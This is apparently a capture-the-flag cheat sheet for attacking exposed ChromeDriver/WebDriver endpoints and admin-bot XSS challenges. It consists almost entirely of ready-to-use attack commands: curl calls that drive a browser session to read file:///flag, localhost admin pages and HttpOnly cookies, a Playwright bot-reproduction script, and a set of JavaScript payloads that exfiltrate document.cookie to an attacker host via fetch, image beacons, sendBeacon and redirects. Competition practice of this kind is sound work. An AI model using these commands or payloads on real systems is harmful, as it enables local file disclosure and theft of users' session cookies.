# Quick reference — the card you keep open

## Lifecycle (always close it)

```bash
S=$(curl -s -X POST http://HOST:9515/session -H 'Content-Type: application/json' \
  -d '{"capabilities":{"alwaysMatch":{"browserName":"chrome"}}}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"]["sessionId"])')
# ... work ...
curl -s -X DELETE http://HOST:9515/session/$S
```

## The commands

| Goal | Command |
|---|---|
| navigate | `POST .../url -d '{"url":"..."}'` |
| read DOM/file | `GET .../source` |
| run JS | `POST .../execute/sync -d '{"script":"return X","args":[]}'` |
| async JS | `POST .../execute/async` |
| cookies | `GET .../cookies` |
| screenshot | `GET .../screenshot` |
| set cookie | `POST .../cookies -d '{"cookie":{...}}'` |

## The reads by flag location

```bash
# file
curl -X POST .../session/$S/url -d '{"url":"file:///flag"}'; curl .../session/$S/source
# loopback
curl -X POST .../session/$S/url -d '{"url":"http://localhost/admin"}'; curl .../session/$S/source
# cookie jar (HttpOnly too)
curl .../session/$S/cookies
# JS cookie/storage
curl -X POST .../session/$S/execute/sync -d '{"script":"return document.cookie","args":[]}'
# same-origin flag page
curl -X POST .../session/$S/execute/sync -d '{"script":"return fetch(\"/flag\").then(r=>r.text())","args":[]}'
# rendered
curl .../session/$S/screenshot | python3 -c 'import sys,json,base64;open("s.png","wb").write(base64.b64decode(json.load(sys.stdin)["value"]))'
```

## The local-bot reproduction (playwright)

```python
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    b=p.chromium.launch(headless=True,args=['--no-sandbox','--disable-dev-shm-usage'])
    pg=b.new_page()
    pg.on("console",lambda m:print("C:",m.text)); pg.on("pageerror",lambda e:print("E:",e))
    pg.on("request",lambda r:print("R:",r.method,r.url))
    pg.context.add_cookies([{'name':'flag','value':'TEST','domain':'localhost','path':'/'}])
    pg.goto(URL); pg.wait_for_timeout(5000)
    b.close()
```

## The exfil payloads

```javascript
fetch('https://T/?c='+encodeURIComponent(document.cookie));
new Image().src='https://T/i.png?c='+document.cookie;
navigator.sendBeacon('https://T/?c='+document.cookie);
fetch('/api/p',{method:'POST',body:'b='+document.cookie});   // write-back
top.location='https://T/?c='+document.cookie;
```

## The traps

- canary before exfil; DOM not response body; check tunnel from inside;
  match the bot's flags/wait; DELETE sessions; `TESTFLAG` != flag.
